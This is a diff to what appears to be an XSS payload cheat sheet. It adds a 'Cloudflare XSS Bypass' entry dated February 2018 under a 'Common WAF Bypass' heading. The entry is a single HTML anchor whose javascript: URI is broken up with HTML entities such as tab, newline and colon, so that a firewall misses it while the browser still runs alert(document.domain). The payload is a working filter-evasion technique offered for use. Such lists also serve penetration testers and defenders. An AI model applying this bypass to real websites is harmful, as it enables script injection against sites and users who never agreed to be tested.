@@ -817,6 +817,12 @@ Works for CSP like `script-src self`
 
 ## Common WAF Bypass
 
+### Cloudflare XSS Bypass - 27th february 2018
+
+```html
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+```
+
 ### Chrome Auditor - 9th august 2018
 
 ```javascript
